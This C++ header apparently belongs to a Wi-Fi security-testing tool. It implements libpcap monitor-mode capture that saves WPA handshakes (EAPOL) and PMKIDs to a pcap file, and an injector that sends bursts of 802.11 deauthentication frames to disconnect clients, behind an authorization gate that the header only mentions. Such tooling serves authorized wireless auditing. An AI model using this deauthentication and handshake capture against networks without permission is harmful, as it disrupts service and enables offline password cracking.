#pragma once

// Native libpcap realizations of the capture + injection HAL (preferred half of the
// hybrid backend). Compiled only when ZD_WITH_LIBPCAP is defined and <pcap.h> is present.
//
//   - NativeCaptureSource: opens the monitor interface with libpcap, decodes radiotap +
//     802.11 frames via dot11.hpp, and yields full frame-level events every poll
//     (beacons, deauth/disassoc, EAPOL handshakes, PMKIDs) that airodump CSV cannot show.
//   - NativeInjector: crafts 802.11 deauthentication frames and transmits them with
//     pcap_sendpacket. The authorization gate (SecSession) is enforced before this runs.

#ifdef ZD_WITH_LIBPCAP

#include <pcap/pcap.h>

#include <atomic>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <deque>
#include <mutex>
#include <string>
#include <thread>
#include <unordered_set>
#include <vector>

#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>

#include "zd/dot11.hpp"
#include "zd/secops_hal.hpp"
#include "dot11.hpp"
#include "../app/clock.hpp"

namespace zd {
namespace linux_backend {

inline void setPcapCloexec(pcap_t* h) {
    if (h == nullptr) {
        return;
    }
    const int fd = pcap_get_selectable_fd(h);
    if (fd >= 0) {
        const int flags = ::fcntl(fd, F_GETFD);
        if (flags >= 0) {
            (void)::fcntl(fd, F_SETFD, flags | FD_CLOEXEC);
        }
    }
}

class NativeCaptureSource final : public sec::ICaptureSource {
public:
    static constexpr std::size_t kMaxQueuedFrames = 4096u;

    NativeCaptureSource() = default;
    NativeCaptureSource(const NativeCaptureSource&) = delete;
    NativeCaptureSource& operator=(const NativeCaptureSource&) = delete;
    ~NativeCaptureSource() override { stop(); }

    void setPcapDumpPath(std::string path) { dumpPath_ = std::move(path); }

    bool start(const std::string& monitorIface) override {
        if (handle_ != nullptr) {
            return true;
        }
        char errbuf[PCAP_ERRBUF_SIZE] = {0};
        handle_ = pcap_create(monitorIface.c_str(), errbuf);
        if (handle_ == nullptr) {
            setError(errbuf);
            return false;
        }
        int cfg = 0;
        cfg |= pcap_set_snaplen(handle_, 2048);
        cfg |= pcap_set_promisc(handle_, 1);
        cfg |= pcap_set_timeout(handle_, 50);
        cfg |= pcap_set_immediate_mode(handle_, 1);
        (void)cfg;  // best-effort tuning; activation below is the authoritative check
        const int actRc = pcap_activate(handle_);
        if (actRc < 0) {
            setError(pcap_geterr(handle_));
            pcap_close(handle_);
            handle_ = nullptr;
            return false;
        }
        if (actRc > 0) {
            setError(pcap_geterr(handle_));  // non-fatal warning (e.g. promisc not supported)
        }
        setPcapCloexec(handle_);
        const int dlt = pcap_datalink(handle_);
        if (dlt != DLT_IEEE802_11_RADIO && dlt != DLT_IEEE802_11) {
            setError("interface is not in monitor mode (unexpected DLT)");
            pcap_close(handle_);
            handle_ = nullptr;
            return false;
        }
        hasRadiotap_ = (dlt == DLT_IEEE802_11_RADIO);
        openDumper();

        stopRequested_.store(false, std::memory_order_release);
        running_.store(true, std::memory_order_release);
        worker_ = std::thread([this]() { captureLoop(); });
        return true;
    }

    std::vector<sec::CapturedFrame> poll() override {
        std::deque<sec::CapturedFrame> drained;
        {
            std::lock_guard<std::mutex> lock(queueMutex_);
            drained.swap(queue_);
        }
        std::vector<sec::CapturedFrame> out;
        out.reserve(drained.size());
        for (auto& f : drained) {
            out.push_back(std::move(f));
        }
        return out;
    }

    void stop() override {
        stopRequested_.store(true, std::memory_order_release);
        if (handle_ != nullptr) {
            pcap_breakloop(handle_);
        }
        if (worker_.joinable()) {
            worker_.join();
        }
        running_.store(false, std::memory_order_release);
        closeDumper();
        if (handle_ != nullptr) {
            pcap_close(handle_);
            handle_ = nullptr;
        }
        std::lock_guard<std::mutex> lock(queueMutex_);
        queue_.clear();
    }

    bool running() const override { return running_.load(std::memory_order_acquire); }
    std::string lastError() const {
        std::lock_guard<std::mutex> lock(errorMutex_);
        return lastError_;
    }

private:
    void setError(std::string err) {
        std::lock_guard<std::mutex> lock(errorMutex_);
        lastError_ = std::move(err);
    }

    void captureLoop() {
        while (!stopRequested_.load(std::memory_order_acquire)) {
            batchQueue_.clear();
            const int n = pcap_dispatch(handle_, 256, &NativeCaptureSource::trampoline,
                                        reinterpret_cast<u_char*>(this));
            if (!batchQueue_.empty()) {
                std::lock_guard<std::mutex> lock(queueMutex_);
                for (auto& f : batchQueue_) {
                    if (queue_.size() >= kMaxQueuedFrames) {
                        queue_.pop_front();
                    }
                    queue_.push_back(std::move(f));
                }
                batchQueue_.clear();
            }
            if (n == PCAP_ERROR_BREAK || stopRequested_.load(std::memory_order_acquire)) {
                break;
            }
            if (n < 0) {
                setError(pcap_geterr(handle_));
                break;
            }
        }
        running_.store(false, std::memory_order_release);
    }

    void openDumper() {
        closeDumper();
        dumpedBeaconBssids_.clear();
        if (dumpPath_.empty() || handle_ == nullptr) {
            return;
        }
        const int fd = ::open(dumpPath_.c_str(),
                              O_WRONLY | O_CREAT | O_NOFOLLOW | O_NONBLOCK | O_CLOEXEC, 0600);
        if (fd < 0) {
            return;
        }
        struct stat st {};
        if (::fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || ::ftruncate(fd, 0) != 0) {
            ::close(fd);
            return;
        }
        (void)::fchmod(fd, 0600);
        FILE* fp = ::fdopen(fd, "wb");
        if (fp == nullptr) {
            ::close(fd);
            return;
        }
        dumper_ = pcap_dump_fopen(handle_, fp);
        if (dumper_ == nullptr) {
            ::fclose(fp);
        }
    }

    void closeDumper() {
        if (dumper_ != nullptr) {
            pcap_dump_flush(dumper_);
            pcap_dump_close(dumper_);
            dumper_ = nullptr;
        }
    }

    static void trampoline(u_char* user, const struct pcap_pkthdr* h, const u_char* bytes) {
        auto* self = reinterpret_cast<NativeCaptureSource*>(user);
        const uint32_t now = linux_app::nowMs();
        std::optional<sec::CapturedFrame> f;
        if (self->hasRadiotap_) {
            f = decodeRadiotapFrame(bytes, h->caplen, now);
        } else {
            f = decodeDot11(bytes, h->caplen, now, -100);
        }
        if (f.has_value()) {
            if (self->dumper_ != nullptr) {
                if (f->kind == sec::FrameKind::Eapol || f->kind == sec::FrameKind::Pmkid) {
                    pcap_dump(reinterpret_cast<u_char*>(self->dumper_), h, bytes);
                } else if (f->kind == sec::FrameKind::Beacon && !f->bssid.empty()) {
                    if (self->dumpedBeaconBssids_.size() >= 1024u) {
                        self->dumpedBeaconBssids_.clear();
                    }
                    if (self->dumpedBeaconBssids_.insert(f->bssid).second) {
                        pcap_dump(reinterpret_cast<u_char*>(self->dumper_), h, bytes);
                    }
                }
            }
            self->batchQueue_.push_back(std::move(*f));
        }
    }

    pcap_t* handle_ = nullptr;
    pcap_dumper_t* dumper_ = nullptr;
    bool hasRadiotap_ = true;
    std::atomic<bool> running_{false};
    std::atomic<bool> stopRequested_{false};
    std::thread worker_;
    std::mutex queueMutex_;
    mutable std::mutex errorMutex_;
    std::deque<sec::CapturedFrame> queue_;
    std::vector<sec::CapturedFrame> batchQueue_;
    std::unordered_set<std::string> dumpedBeaconBssids_;
    std::string dumpPath_;
    std::string lastError_;
};

class NativeInjector final : public sec::IInjector {
public:
    explicit NativeInjector(sec::IMonitorControl* monitor) : monitor_(monitor) {}
    NativeInjector(const NativeInjector&) = delete;
    NativeInjector& operator=(const NativeInjector&) = delete;
    ~NativeInjector() override { closeHandle(); }

    bool available() const override {
        return monitor_ != nullptr && monitor_->isMonitor();
    }

    sec::InjectResult deauth(const std::string& bssid, const std::string& client,
                             uint32_t count) override {
        sec::InjectResult res;
        res.decision = sec::AuthDecision::Allowed;  // gate already cleared by SecSession
        if (!ensureHandle()) {
            res.transmitted = false;
            res.detail = "pcap open failed: " + lastError_;
            return res;
        }
        uint8_t ap[6], sta[6];
        if (!zd::dot11::parseMac(bssid.c_str(), ap) || sec::isMulticastMac(bssid)) {
            res.transmitted = false;
            res.detail = "bad BSSID";
            return res;
        }
        if (!sec::isValidClientTarget(client)) {
            res.transmitted = false;
            res.detail = "bad client MAC";
            return res;
        }
        const bool broadcast = client.empty() || sec::isBroadcastMac(sec::normalizeMac(client));
        if (broadcast) {
            std::memset(sta, 0xFF, 6);
        } else if (!zd::dot11::parseMac(client.c_str(), sta)) {
            res.transmitted = false;
            res.detail = "bad client MAC";
            return res;
        }

        const uint32_t safeCount = (count < 1u) ? 1u : ((count > kMaxBurst) ? kMaxBurst : count);
        int sent = 0;
        for (uint32_t i = 0; i < safeCount; ++i) {
            // AP -> client (or broadcast)
            if (sendDeauth(sta, ap, ap)) {
                ++sent;
            }
            // client -> AP (targeted only), as aireplay does, to hit both directions.
            if (!broadcast && sendDeauth(ap, sta, ap)) {
                ++sent;
            }
        }
        if (sent == 0) {
            // Drop potentially stale handle so a subsequent call reopens cleanly.
            closeHandle();
        }
        res.transmitted = sent > 0;
        res.detail = "pcap_sendpacket deauth x" + std::to_string(sent);
        return res;
    }

private:
    static constexpr uint32_t kMaxBurst = 1000u;

    bool ensureHandle() {
        if (monitor_ == nullptr || !monitor_->isMonitor()) {
            closeHandle();
            lastError_ = "no monitor interface";
            return false;
        }
        const std::string curIface = monitor_->monitorIface();
        if (handle_ != nullptr) {
            if (openedIface_ == curIface) {
                return true;
            }
            closeHandle();
        }
        char errbuf[PCAP_ERRBUF_SIZE] = {0};
        handle_ = pcap_open_live(curIface.c_str(), 800, 0, 100, errbuf);
        if (handle_ == nullptr) {
            lastError_ = errbuf;
            return false;
        }
        setPcapCloexec(handle_);
        openedIface_ = curIface;
        return true;
    }

    void closeHandle() {
        if (handle_ != nullptr) {
            pcap_close(handle_);
            handle_ = nullptr;
        }
        openedIface_.clear();
    }

    // Build + send one 802.11 deauth reusing the portable core frame builder.
    bool sendDeauth(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid) {
        uint8_t frame[8u + zd::dot11::kMgmtDeauthFrameLen];
        // Minimal radiotap header (version 0, length 8, no fields).
        const uint8_t rt[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};
        std::memcpy(frame, rt, sizeof(rt));
        const std::size_t bodyLen = zd::dot11::buildDeauthFrame(frame + sizeof(rt), dst, src, bssid);
        return pcap_sendpacket(handle_, frame, static_cast<int>(sizeof(rt) + bodyLen)) == 0;
    }

    sec::IMonitorControl* monitor_;
    pcap_t* handle_ = nullptr;
    std::string openedIface_;
    std::string lastError_;
};

}  // namespace linux_backend
}  // namespace zd

#endif  // ZD_WITH_LIBPCAP
